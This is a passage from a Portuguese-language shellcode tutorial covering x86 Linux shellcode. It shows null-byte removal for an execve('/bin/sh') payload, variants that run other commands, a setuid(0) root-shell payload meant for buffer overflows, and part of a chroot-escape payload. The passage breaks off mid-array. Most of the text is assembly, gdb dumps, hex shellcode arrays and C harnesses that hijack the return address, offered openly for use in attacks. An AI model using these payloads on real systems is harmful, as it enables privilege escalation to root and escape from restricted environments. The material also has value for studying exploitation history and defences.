podemos inserir ele  num exploit sem  antes tirar-lhe todos  os bytes nulos(null
bytes).Por  que?  Leia  o  tutorial  sobre  overflows  que  fiz,  em  breve   na
http://unsekurity.virtualave.net  ...ele  explica o  porque  disso. Seguindo  em
frente, para tirarmos os bytes nulos, seguimos o seguinte esquema:

Instrucao com null byte                       Trocar por:
------------------------------------------------------------------------
movb $0x0,0x7(%esi)                         xorl %eax,%eax
                                            movb %eax,0x7(%esi)
movl $0x0,0xc(%esi)                         movl %eax,0xc(%esi)
-------------------------------------------------------------------------
movl $0xb,%eax                              movb $0xb,%al
-------------------------------------------------------------------------
movl $0x1,%eax                              xorl %ebx,%ebx
movl $0x0,%ebx                              movl %ebx,%eax
                                            inc  %eax
-------------------------------------------------------------------------
Como podemos ver, nao ha muita coisa para fazermos no intuito de retirar
os null bytes.Veremos entao como fica o nosso codigo apos a substituicao
dos mesmos:

/* Shellcode com sobstituicao dos null bytes */

#include <stdio.h>
main(){
__asm__("
jmp 0x1f                                #2 bytes
popl %esi                               #1 byte
movl %esi,0x8(%esi)                     #3 bytes
xorl %eax,%eax                          #2 bytes
movb %eax,0x7(%esi)                     #3 bytes
movl %eax,0xc(%esi)                     #3 bytes
movb $0xb,%al                           #2 bytes
movl %esi,%ebx                          #2 bytes
leal 0x8(%esi),%ecx                     #3 bytes
leal 0xc(%esi),%edx                     #3 bytes
int $0x80                               #2 bytes
xorl %ebx,%ebx                          #2 bytes
movl %ebx,%eax                          #2 bytes
inc %eax                                #1 byte
int $0x80                               #2 bytes
call -0x24                              #5 bytes
.string \"/bin/sh\"                     #8 bytes
");
}

Compilamos entao usando a seguinte sintaxe:
[localhost:/]$gcc -ggdb -static -o shellnova1 shellnova1.c

Em seguida usamos o debugador p/ novamente pegarmos o codigo em hexa:
[localhost:/]$gdb shellnova1
GNU gdb 4.18
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you
are welcome to change it and/or distribute copies of it under certain
conditions.Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for
details.This GDB was configured as "i686-pc-linux-gnulibc1"...
(gdb)disassemble main
Dump of assembler code for function main:
0x8048150 <main>:       push   %ebp
0x8048151 <main+1>:     mov    %esp,%ebp
0x8048153 <main+3>:     jmp    0x8048174 <main+36>
0x8048155 <main+5>:     pop    %esi
0x8048156 <main+6>:     mov    %esi,0x8(%esi)
0x8048159 <main+9>:     xor    %eax,%eax
0x804815b <main+11>:    mov    %al,0x7(%esi)
0x804815e <main+14>:    mov    %eax,0xc(%esi)
0x8048161 <main+17>:    mov    $0xb,%al
0x8048163 <main+19>:    mov    %esi,%ebx
0x8048165 <main+21>:    lea    0x8(%esi),%ecx
0x8048168 <main+24>:    lea    0xc(%esi),%edx
0x804816b <main+27>:    int    $0x80
0x804816d <main+29>:    xor    %ebx,%ebx
0x804816f <main+31>:    mov    %ebx,%eax
0x8048171 <main+33>:    inc    %eax
0x8048172 <main+34>:    int    $0x80
0x8048174 <main+36>:    call   0x8048155 <main+5>
0x8048179 <main+41>:    das
0x804817a <main+42>:    bound  %ebp,0x6e(%ecx)
0x804817d <main+45>:    das
0x804817e <main+46>:    jae    0x80481e8 <__new_exitfn+52>
0x8048180 <main+48>:    add    %cl,0x90c35dec(%ecx)
End of assembler dump.
(gdb) x/xb main+3
0x8048153 <main+3>:     0xeb
(gdb) x/xb main+4
0x8048154 <main+4>:     0x1f
(gdb) x/xb main+5
0x8048155 <main+5>:     0x5e
(gdb) x/xb main+6
0x8048156 <main+6>:     0x89
(gdb) x/xb main+7
0x8048157 <main+7>:     0x76
(gdb) x/xb main+8
0x8048158 <main+8>:     0x08
(gdb) x/xb main+9
0x8048159 <main+9>:     0x31
.
.
.
0x8048178 <main+40>:    0xff

Podemos  perfeitamente  parar por  aqui  e no  nosso  shellcode no  codigo-fonte
acrescentarmos a string /bin/sh que se refere ao que queremos executar.  Fazendo
isso teriamos o seguinte shellcode:

char shellcode[] =
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

Mas  se nos  quisermos substituir  a string  /bin/sh por  seu correspondente  em
hexadecimal,  nos devemos  continuar pegando  os respectivos  codigos hexa  pelo
debugador,  ateh encontrarmos  uma intrucao  nop que  corresponderah ao  fim da
funcao main().Vejamos:

Haviamos para em <main + 40>
Continuando:

(gdb) x/xb main+41
0x8048179 <main+41>:    0x2f
(gdb) x/xb main+42
0x804817a <main+42>:    0x62
(gdb) x/xb main+43
0x804817b <main+43>:    0x69
(gdb) x/xb main+44
0x804817c <main+44>:    0x6e
(gdb) x/xb main+45
0x804817d <main+45>:    0x2f
.
.
.
0x8048183 <main+51>:    0x5d
(gdb) x/xb main+52
0x8048184 <main+52>:    0xc3
(gdb) x/xb main+53
0x8048185 <main+53>:    0x90
(gdb) x/xb main+54
0x8048186 <main+54>:    0x90

Como podemos ver chegamos ateh  a instrucao NOP(0x90), logo nao  incluiremos ela
em  nosso shellcode,  devemos entao  acrescentar ateh  <main+52>, fazendo  entao
nosso shellcode ficar assim:

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec"
  "\x5d\xc3";

Feito isso tudo iremos agora inserir nosso exemplo de shellcode
dentro de um codigo-fonte C.

/* Simples Exemplo de Shellcode com string /bin/sh em hexa
   Compile com: $gcc -o shellnova2 shellnova2.c */

#include <stdlib.h>

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec"
  "\x5d\xc3";

void main(){
int *retorno;
retorno = (int *)&retorno + 2;
(*retorno) = (int)shellcode;
}

O esquema na linha de comando seria:
[localhost:/]$ gcc -o shellnova2 shellnova2.c
[localhost:/]$ ./shellnova2
bash$ exit
exit

Como podemos ver  perfeitamente, ele funciona  bem como queriamos.  Voce que vai
usa-lo em buffer overflows,boa sorte!!Lembrando que alguns shellcodes devem  ser
usados p/ determinada situacao e outros p/ outras situacoes.Use seus  neuronios,
pense nas formas de ataque, e  da necessidade de cada shellcode, vai  fundo, nao
deixe de estudar,pesquise,descubra!!

Como prometido, disponibilizarei  agora alguns esquemas  que podemos fazer  para
executar alguns codigos maliciosos em cima deste exemplo descrito acima.Para  os
codigos  que se  seguem,tudo que  devemos fazer  eh substituir  simplesmente, o
comando "/bin/sh" que queremos executar, no final de nosso shellcode, por outro,
de tamanho igual. Vejamos nosso shellcode como estah:

char shellcode[] =
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

Eh essa string acima "/bin/sh", que estou me referindo, voce pode testar  outros
comandos inserindo-os no  lugar dela,sendo que  de tamanho igual,  como /bin/ls,
/bin/su, /bin/ed e por aih vai. Vejamos alguns exemplos bem praticos:

+ Simples shellcode para executar um ls;

/* Shellcode que executa um ls */
#include <stdio.h>

/* Apenas trocamos /bin/sh por /bin/ls no final do shellcode */

char shellcode[] =
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/ls";

void main() {
   int *retorno;

   retorno = (int *)&retorno + 2;
   (*retorno) = (int)shellcode;

}

Compilamos e executamos:

[localhost:/]$ gcc -o shels shels.c
[localhost:/]$ ./shels
exe1.c                 heap3                  shellcode2
exe2                   heap3.c                shellcode2.c
exe2.c                 mall                   shellcode2.s
exploit.txt            mall.c                 shellcodeasm
exploit1               mall1                  shellcodeasm.c
exploit1.c             my                     shels
exploit2               nistir4909             shels.c
exploit2.c             out.c                  shelsc
exploit3               perlsec.txt            shelsc.c
exploit3.c             review.txt             sp
exploit4               robust.txt             sp.c
exploit4.c             seculinuxprog          sta
fake                   secure_prog_checklist  sta.c
fake_exp               security-holes.txt     suid
fake_exp.c             setuid.7.txt           suid.c
find                   sh1                    taxonomy.ps
full-cve.txt           sh1.c                  testsc
fuzz-revisited.ps.Z    shel1.c                testsc.c
heap1                  shell1.c               vulnerable
heap1.c                shellcode              vulnerable.c

Podemos ver que ele funfa(funciona) perfeitamente!!:)

Mas voce nao  iria estudar e  pesquisar muito somente  para executar um  comando
desse  tipo..Nao  sei  mano,vai  ver  ele  pode  ser  util  para  alguma   coisa
remotamente, talvez envolvendo  sockets, mas coloquei  ele aih para  ilustrar de
forma clara e simples a alteracao basica de um shellcode.Olhando para o  exemplo
acima voce pode tirar algumas  conclusoes apressadas, como trocar o  /bin/sh por
/bin/zsh, ou mesmo por  /bin/tcsh, ou qualquer outra  shell, mas na verdade  nao
funciona deste modo,  teremos sim que  ralar para fazermos  shellcodes para cada
uma  delas,  o  exemplo  citada   nos  da  permissao  para  executarmos   alguns
comandos(somente  alguns)  de tamanho  igual  shell "/bin/sh"  ou  da que  estah
linkada para ela, como  em muitos sistemas encontramos  /bin/bash, que eh o  meu
caso.Veremos como fazer alguns outros tipos de shell mais abaixo. Para ilutrar e
voce poder entender melhor o que  estou dizendo, veja o mesmo exemplo  acima mas
com mais caracteres apos a execucao de ls:

/* Exemplo de shellcode, para mostrar que nao faz efeito
   colocarmos mais caracteres do que o suportado pelo
   nosso exemplo inicial */

#include <stdio.h>
#include <stdlib.h>


char shellcode[] =
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/lsissoquetahentrandoaquiehparailustrar";

void main() {
   int *retorno;

   retorno = (int *)&retorno + 2;
   (*retorno) = (int)shellcode;

}

Compilamos normalmente o exemplo acima, e em seguida executamos:

[localhost:/]$ gcc -o ls2.c ls2.c
[localhost:/]$ ./ls2
avancadas     popshbug.c    shell3.c      shellt.c      teso1sh.s
bossh1.c      scsh          shellba       shelltc       teso2sh.c
bossh1.s      scsh.c        shellba.c     shelltc.c     teso2sh.s
difshe        shec          shellc        shelltc.s     teso3sh.c
difshe.c      shechroot.c   shelln.c      shelltcasm    teso3sh.s
difshe.s      shechroot1    shellpron1    shelltcasm.c  testshtc
ls2           shell         shellpron1.c  shelltcasm.s  testshtc.c
ls2.c         shell.c       shellpron2    shelltcsh     trojans
passshe.c     shell2        shellpron2.c  shelt
passwd        shell2.c      shellsetu     tcsh.sh
popshbug      shell3        shellsetu.c   teso1sh.c

Como podemos ver,  nao adiantou nada  metermos um monte  de caracteres no  nosso
shellcode, pois ele soh  procurou executar somente o  tamanho de bytes que  fora
permitido.Se voce tah querendo saber como solucionar isto, leia a parte 7.4. :)


7.2 SHELLCODE P/ SETUID(0)
----------------------------------------------------

Esse exemplo vai para o pessoal que meche com buffer overflows, vamos inserir  o
codido do programa abaixo em nosso shellcode inicial, o do /bin/sh;

/* Codigo de setuid() */

#include <stdio.h>

main()
{
        setuid(0);
}

Compilamos e em seguida executamos gdb;

[localhost:/]$ gcc -o setui setui.c -static -ggdb
[localhost:/]$ gdb setui
GNU gdb 4.18
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you
are welcome to change it and/or distribute copies of it under certain
conditions.Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for
details.This GDB was configured as "i686-pc-linux-gnulibc1"...
(gdb)

Como vamos inserir o codigo, nao precisamos disassemblar main, basta
setuid.

(gdb) disassemble setuid
Dump of assembler code for function setuid:
0x80483e4 <setuid>:     push   %ebp
0x80483e5 <setuid+1>:   mov    %esp,%ebp
0x80483e7 <setuid+3>:   push   %ebx
0x80483e8 <setuid+4>:   mov    $0x17,%eax
0x80483ed <setuid+9>:   mov    0x8(%ebp),%ebx
0x80483f0 <setuid+12>:  int    $0x80
0x80483f2 <setuid+14>:  mov    %eax,%edx
0x80483f4 <setuid+16>:  test   %edx,%edx
0x80483f6 <setuid+18>:  jge    0x8048408 <setuid+36>
0x80483f8 <setuid+20>:  neg    %edx
0x80483fa <setuid+22>:  push   %edx
0x80483fb <setuid+23>:  call   0x8050b0c <__normal_errno_location>
0x8048400 <setuid+28>:  pop    %edx
0x8048401 <setuid+29>:  mov    %edx,(%eax)
0x8048403 <setuid+31>:  mov    $0xffffffff,%eax
0x8048408 <setuid+36>:  pop    %ebx
0x8048409 <setuid+37>:  mov    %ebp,%esp
0x804840b <setuid+39>:  pop    %ebp
0x804840c <setuid+40>:  ret
0x804840d <setuid+41>:  nop
0x804840e <setuid+42>:  nop
0x804840f <setuid+43>:  nop
End of assembler dump.
(gdb)

O codigo eh enorme, mas voce jah sabe, somente as primeiras 6 linhas
nos interessam...abaixo estao elas:

0x80483e4 <setuid>:     push   %ebp
0x80483e5 <setuid+1>:   mov    %esp,%ebp
0x80483e7 <setuid+3>:   push   %ebx
0x80483e8 <setuid+4>:   mov    $0x17,%eax
0x80483ed <setuid+9>:   mov    0x8(%ebp),%ebx
0x80483f0 <setuid+12>:  int    $0x80

Lembrando que queremos somente ateh a instrucao int $0x80, que faz com
que nosso programa entre no modo kernel.

Traduzindo o que essas 6 linhas representam:

0x80483e4 <setuid>:     push   %ebp
0x80483e5 <setuid+1>:   mov    %esp,%ebp
0x80483e7 <setuid+3>:   push   %ebx

Procedimento Preludio, ou inicial.Velho esquema, nao iremos inserir
essas 3 linhas no nosso codigo por razoes obvias, jah temos um
procedimento inicial(preludio) no nosso shellcode.

0x80483e8 <setuid+4>:   mov    $0x17,%eax
0x80483ed <setuid+9>:   mov    0x8(%ebp),%ebx
0x80483f0 <setuid+12>:  int    $0x80

Essas sim nos interessam, pois sao as responsaveis pela execucao
do codigo que nos interessa, neste caso setuid(0).Para nao termos
bytes nulos(null bytes), alteramos essas linhas da seguinte forma:

Pegamos:					Substituimos por:
----------------------			---------------------------
mov    $0x17,%eax		               xorl %eax,%eax
mov    0x8(%ebp),%ebx			       xorl %ebx,%ebx
					       mov  $0x17,%al
-------------------------------------------------------------------

Deixamos esta como esta:

int    $0x80

Depois juntado tudo teremos o shellcode para setuid(0), assim:


xorl %eax,%eax
xorl %ebx,%ebx
movb $0x17,%al
int $0x80

Acrescentando ele ao inicio de nosso shellcode /bin/sh inicial,
teremos:

#include <stdio.h>
main(){
__asm__("
xorl %eax,%eax
xorl %ebx,%ebx
movb $0x17,%al
int $0x80
jmp 0x1f
popl %esi
movl %esi,0x8(%esi)
xorl %eax,%eax
movb %eax,0x7(%esi)
movl %eax,0xc(%esi)
movb $0xb,%al
movl %esi,%ebx
leal 0x8(%esi),%ecx
leal 0xc(%esi),%edx
int $0x80
xorl %ebx,%ebx
movl %ebx,%eax
inc %eax
int $0x80
call -0x24
.string \"/bin/sh\"
");
}


Depois disso compilamos e executamos o gdb.Lembrando, compile com -static
e -ggdb, para nao dar erros.

(gdb) disassemble main
Dump of assembler code for function main:
0x8048150 <main>:       push   %ebp
0x8048151 <main+1>:     mov    %esp,%ebp
0x8048153 <main+3>:     xor    %eax,%eax
0x8048155 <main+5>:     xor    %ebx,%ebx
0x8048157 <main+7>:     mov    $0x17,%al
0x8048159 <main+9>:     int    $0x80
0x804815b <main+11>:    jmp    0x804817c <main+44>
0x804815d <main+13>:    pop    %esi
0x804815e <main+14>:    mov    %esi,0x8(%esi)
0x8048161 <main+17>:    xor    %eax,%eax
0x8048163 <main+19>:    mov    %al,0x7(%esi)
0x8048166 <main+22>:    mov    %eax,0xc(%esi)
0x8048169 <main+25>:    mov    $0xb,%al
0x804816b <main+27>:    mov    %esi,%ebx
0x804816d <main+29>:    lea    0x8(%esi),%ecx
0x8048170 <main+32>:    lea    0xc(%esi),%edx
0x8048173 <main+35>:    int    $0x80
0x8048175 <main+37>:    xor    %ebx,%ebx
0x8048177 <main+39>:    mov    %ebx,%eax
0x8048179 <main+41>:    inc    %eax
0x804817a <main+42>:    int    $0x80
0x804817c <main+44>:    call   0x804815d <main+13>
0x8048181 <main+49>:    das
0x8048182 <main+50>:    bound  %ebp,0x6e(%ecx)
0x8048185 <main+53>:    das
0x8048186 <main+54>:    jae    0x80481f0 <__new_exitfn+52>
0x8048188 <main+56>:    add    %cl,0x90c35dec(%ecx)
End of assembler dump.

Depois vamos na marra pegar a representacao em hexa de todo nosso
shellcode.

(gdb) x/xb main+3
0x8048153 <main+3>:     0x31
(gdb) x/xb main+4
0x8048154 <main+4>:     0xc0
(gdb) x/xb main+5
0x8048155 <main+5>:     0x31
(gdb) x/xb main+6
0x8048156 <main+6>:     0xdb
(gdb) x/xb main+7
0x8048157 <main+7>:     0xb0
(gdb)
.
.
.
(gdb) x/xb main+56
0x8048188 <main+56>:    0x00
(gdb) x/xb main+57
0x8048189 <main+57>:    0x89
(gdb) x/xb main+58
0x804818a <main+58>:    0xec
(gdb) x/xb main+59
0x804818b <main+59>:    0x5d
(gdb) x/xb main+60
0x804818c <main+60>:    0xc3
(gdb) x/xb main+61
0x804818d <main+61>:    0x90

Chegamos no tal NOP, aqui paramos.
Veremos agora como ele fica inserido no codigo C.

/* shellcode setuid(0) em /bin/sh */
#include <stdio.h>
#include <stdlib.h>


char shellcode[] =
  "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec"
  "\x5d\xc3";

main(){
int *retorno;
retorno = (int *)&retorno +2;
(*retorno) = (int)shellcode;
}

Compile  normalmente  "gcc -o  shellsetuid  shellsetuid.c".Depois execute,  voce
verah  que  ele funcione  perfeitamente.Eu  coloquei a  linha  correspondente ao
codigo que  acrescentamos na  primeira linha,  para voce  visualizar melhor.Voce
pode perceber  que as  instrucoes e  seus referentes  codigos em  hexa depois de
"\xcd\x80" (int  $0x80) na  primeira linha  ateh o  fim sao  identicas ao  nosso
shellcode inicial.Isso mesmo amigo, voce  pode sim somente trabalhar em  cima do
codigo  que  quer  acrescentar,  sem  a  necessidade  de  ficar  perdendo tempo,
principalmente quando quer passar para a representacao dele em hexa, coloquei  o
esquema acima para que voce vah logo se acostumando, e tambem para que nao  haja
duvida quanto as instrucoes em representacao hexadecimal.Esse shellcode pode ser
usado em programas vulneraveis a buffer overflows, mas que quando exploitados  o
fazem cair  na sua  propria shell,  colocando setuid(0),  voce cairah  numa root
shell.


7.4 - QUEBRANDO CHROOT()
-------------------------

Bem,  para quem  nao sabe  o que  eh chroot(),  aqui vai  uma breve  explicacao.
chroot() eh uma funcao usada comumente para nao permitir acesso de um usuario  a
outros  diretorios, chroot()  seta um  diretorio para  ser o  diretorio raiz  do
usuario, nao permitindo que ele tenha acesso a outros diretorios "antes" daquele
setado.Um exemplo  pratico disso,  nos vemos  quase sempre  quando entramos  num
servidor  de  ftp  como  usuario  anonymous,  nos  caimos  geralmente  dentro do
diretorio raiz  "/", mas  na verdade  devemos estar  no diretorio "/home/ftp" do
servidor em questao.Entao  amigos, o que  foi feito foi  ter setado o  diretorio
"/home/ftp", atraves da funcao chroot() para fazer com que este diretorio seja o
diretorio raiz  "/" para  um determinado  usuario, no  nosso caso, anonymous.Mas
isso  eh bastante  comun, vemos  isso em  servidores de  home pages  gratuitas,
servidore de ftp com acesso via conta, enfim, diversos sao os casos.Soh que mais
uma vez, o pessoal agiu, descobriram que atraves de um buffer overflow, ou mesmo
pela execucao  de um  shellcode como  root(atravez de  um programa suid),que era
possivel  inserir  codigo malioso  que  quebrasse essa  protecao.Isso  vem sendo
durante  muito  tempo  usado, principalmente  em  "remote  buffer overflows"  em
servidores de ftp.  O que vai  ser explicado aqui  nao eh como  se faz overflows
para se quebrar  isso, mas sim,  uma forma de  executar um codigo  como root que
"quebre" esta defesa.

Veremos um esquema para se "quebrar"  isso, mas eu conheco outro esquema  ainda,
veja depois o item 7.4.


/* Primeiro tipo de shellcode para quebrar chroot() */

#include <stdio.h>
#include <stdlib.h>

main()
{
        mkdir("sh",0755);
        chroot("sh");

        /* Colocamos muitos  "../", voce pode ver a funcionalidade
	   deles executando em sua shell, verah que cairah no
           diretorio raiz, lembrando: "Tem muito servidor de http
           por aih que permitem atraves disso  que se leia um
           arquivo do sistema! */

        chroot("../../../../../../../../../../../../../../../../");
}

Compilamos com as opcoes para gerar codigo estatico, em seguida
carregamos o programa no debugador gdb.

[localhost:/]$ gcc -o shechroot1 shechroot1.c -static -ggdb
[localhost:/]$ gdb shechroot1
GNU gdb 4.18
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you
are welcome to change it and/or distribute copies of it under certain
conditions.Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for
details.This GDB was configured as "i686-pc-linux-gnulibc1"...
(gdb)

Se voce digitar "disassemble main" verah a chamada para as 3 funcoes
ou system calls responsaveis pela quebra, nao colocarei aqui, mas
de uma olhada para que nao haja duvidas.

Seguimos abaixo desassemblando o codigo de mkdir.

(gdb) disassemble mkdir
Dump of assembler code for function mkdir:
0x8048404 <mkdir>:      push   %ebp
0x8048405 <mkdir+1>:    mov    %esp,%ebp
0x8048407 <mkdir+3>:    push   %ebx
0x8048408 <mkdir+4>:    mov    $0x27,%eax
0x804840d <mkdir+9>:    mov    0x8(%ebp),%ebx
0x8048410 <mkdir+12>:   mov    0xc(%ebp),%ecx
0x8048413 <mkdir+15>:   int    $0x80
0x8048415 <mkdir+17>:   mov    %eax,%edx
0x8048417 <mkdir+19>:   test   %edx,%edx
0x8048419 <mkdir+21>:   jge    0x804842b <mkdir+39>
0x804841b <mkdir+23>:   neg    %edx
0x804841d <mkdir+25>:   push   %edx
0x804841e <mkdir+26>:   call   0x8050b58 <__normal_errno_location>
0x8048423 <mkdir+31>:   pop    %edx
0x8048424 <mkdir+32>:   mov    %edx,(%eax)
0x8048426 <mkdir+34>:   mov    $0xffffffff,%eax
0x804842b <mkdir+39>:   pop    %ebx
0x804842c <mkdir+40>:   mov    %ebp,%esp
0x804842e <mkdir+42>:   pop    %ebp
0x804842f <mkdir+43>:   ret
End of assembler dump.
(gdb)

Para mkdir, tudo que nos importa sao as primeiras 7 linhas.Dessas 7
linhas, como as 3 primeiras correspondem ao procedimento inicial ou
preludio, somente as 4 restantes de fato irao nos interessar, eis
elas aih embaixo:

0x8048408 <mkdir+4>:    mov    $0x27,%eax
0x804840d <mkdir+9>:    mov    0x8(%ebp),%ebx
0x8048410 <mkdir+12>:   mov    0xc(%ebp),%ecx
0x8048413 <mkdir+15>:   int    $0x80

O codigo acima faz o seguinte:
mov $0x27,%eax

Coloca o numero correspondente a mkdir na tabela system call(39) em %eax.

mov    0x8(%ebp),%ebx

Coloca o endereco da string "sh" em %ebx.

mov    0xc(%ebp),%ecx

Coloca o endereco a string "0755" em %ecx.


Para o codigo acima, retiramos os null bytes e teremos:

xorl %eax,%eax
xorl %ecx,%ecx
movb $0x27,%al
leal 0x5(%esi),%ebx

Essa instrucao lea aih estah para executar o seguinte:
"%esi" possui referencia a "/bin/sh"  antes de usar esta intrucao, no
caso, esse /bin/sh, eh aquele no nosso primeiro shellcode inicial, onde
esse codigo para quebrar chroot() vai ser inserido.Esta instrucao(leal)
carrega o endereco de "sh", nao de "/bin/sh", e armazena em %ebx.

incb %ch
movb $0xed,%cl
int $0x80

Em cima aih, complica um pouco.O que estah acontecendo eh o seguinte,
lembrando que CH  eh o registrador counter high, contador de memoria
alta.CX, eh CH + CL, (HIGH e LOW), respectivamente.Inicialmente temos:

CX = 0000 0001 0000 0000


Incrementando %ch (incb %ch), mudaremos todo %cx, como explicado no
capitulo sobre registradores. Entao, agora teremos:

CX = 0000 0001 1110 1101

Pegando soh uma parte dele e movendo sobre cl (Contador Baixo), teremos:

CX = 000 111 101 101

Preste bem atencao, olhe para o CX acima que foi incrementado, veja que
nos pegamos as tres ultimas partes(0001 1110 1101) e dividimos em quatro
partes de 3(000 111 101 101), foi por isso que fiz questao de ensinar
a conversao usando notacoes,amigo. Se voce prestar atencao, pegarah os
respectivos numeros decimais de cada numero binario aih soh olhando:

		000 111 101 101
		 0   7   5   5

Que eh exatamente nosso codigo referido a permissao do diretorio "sh"
que estarah sendo criado.Nao se assuste com tudo isso, amigo, foi soh
para ilustrar, para nossos intuitos, o codigo em C faz quase todo o
trabalho.

Vejamos entao como ficarah o codigo para mkdir():

xorl %eax,%eax
xorl %ecx,%ecx
movb $0x27,%al
leal 0x5(%esi),%ebx
incb %ch
movb $0xed,%cl
int $0x80

Eis aih nosso codigo.mkdir() estah exterminado, agora vejamos para
chroot().Voltemos novamente ao gdb.

(gdb) disassemble chroot
Dump of assembler code for function chroot:
0x8048430 <chroot>:     push   %ebp
0x8048431 <chroot+1>:   mov    %esp,%ebp
0x8048433 <chroot+3>:   push   %ebx
0x8048434 <chroot+4>:   mov    $0x3d,%eax
0x8048439 <chroot+9>:   mov    0x8(%ebp),%ebx
0x804843c <chroot+12>:  int    $0x80
0x804843e <chroot+14>:  mov    %eax,%edx
0x8048440 <chroot+16>:  test   %edx,%edx
0x8048442 <chroot+18>:  jge    0x8048454 <chroot+36>
0x8048444 <chroot+20>:  neg    %edx
0x8048446 <chroot+22>:  push   %edx
0x8048447 <chroot+23>:  call   0x8050b58 <__normal_errno_location>
0x804844c <chroot+28>:  pop    %edx
0x804844d <chroot+29>:  mov    %edx,(%eax)
0x804844f <chroot+31>:  mov    $0xffffffff,%eax
0x8048454 <chroot+36>:  pop    %ebx
0x8048455 <chroot+37>:  mov    %ebp,%esp
0x8048457 <chroot+39>:  pop    %ebp
0x8048458 <chroot+40>:  ret
0x8048459 <chroot+41>:  nop
0x804845a <chroot+42>:  nop
0x804845b <chroot+43>:  nop
End of assembler dump.


De todo este codigo aih, voce jah deve ter percebido, o que vai nos
interessar eh somente as linhas:

0x8048434 <chroot+4>:   mov    $0x3d,%eax
0x8048439 <chroot+9>:   mov    0x8(%ebp),%ebx
0x804843c <chroot+12>:  int    $0x80

Vejamos em detalhes:

mov    $0x3d,%eax

Coloca o numero correspondente ao system call chroot(61) em %eax.

mov    0x8(%ebp),%ebx

Coloca o endereco de "sh" em %ebx.

int    $0x80

Sai para o modo kernel.

Retirando os byte nulos, teremos:

xorl %eax,%eax
leal 0x5(%esi),%ebx
movb $0x3d,%al
int $0x80

Para esse  codigo nao  tem muito  segredo, mas  agora entrarah  um pouquinho  da
necessidade de  se saber  trabalhar e  escrever em  assembly.O chroot() em nosso
exemplo, possui duas chamadas, podemos ver isso desassemblando main, a  primeira
chamada se refere ao que descrevemos acima, chroot("sh"), a segunda eh a que vou
tentar explicar abaixo:

chroot("../../../../../../../../../../../../../../../../");

O codigo para isto, segue abaixo:

movl $0xffd0d1d2,%ebx
negl %ebx
xorl %ecx,%ecx
movb $0x10,%cl
pushl %esi
addl %ecx,%esi
movl %ebx,(%esi)
addl $0x3,%esi
loopne -0x7
popl %esi
movb $0x3d,%al
leal 0x10(%esi),%ebx
int $0x80

Vamos com bastante calma, vou explicar o que significa isso aih:

movl $0xffd0d1d2,%ebx

Pega o endereco de "../" e guarda em %ebx.

negl %ebx

Eh uma instrucao logica, indicando que %ebx nao eh maior ou igual a
string armazenada(aquele monte de ../).

xorl %ecx,%ecx
movb $0x10,%cl

Um contador nao nulo, preparado p/ contar ateh 16(16 vezes ../).

pushl %esi
addl %ecx,%esi
movl %ebx,(%esi)
addl $0x3,%esi

Nada demais aih em cima, onde tah sendo adicionado ao source index os
16 ../ .

loopne -0x7
popl %esi

O loop para geracao logica. Voce tah vendo aih um numero negativo -0x7,
o loopne salta se o registrador CX, no caso %ecx for diferente de -0x7.

movb    $0x3d,%al

Coloca o numero correspondente ao system call chroot(61) em %al.

leal 0x10(%esi),%ebx

Aqui sim ocorre a "copia" 16 vezes propriamente dita de "../".

int $0x80

Volta para o modo kernel.

Como  voce  pode  ver,  nao  eh  nada  facil  fazer  shellcodes  um  pouco  mais
complexos.Isso foi soh para voce ter uma breve ideia, logico, dependendo do  seu
nivel de conhecimentos em assembly,  isso tudo pode parecer fichinha.Como  quero
descrever soh o basico, ateh mesmo  este exemplo foge ao escopo deste  tutorial,
mas foi soh para voce se empolgar mais!!

Vejamos agora como fica isso aih num programa C.

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shellcode[]=
        "\xeb\x4f"                      /* jmp 0x4f              */
        "\x31\xc0"                      /* xorl %eax,%eax        */
        "\x31\xc9"                      /* xorl %ecx,%ecx        */
        "\x5e"                          /* popl %esi             */
        "\x88\x46\x07"                  /* movb %al,0x7(%esi)    */
        "\xb0\x27"                      /* movb $0x27,%al        */
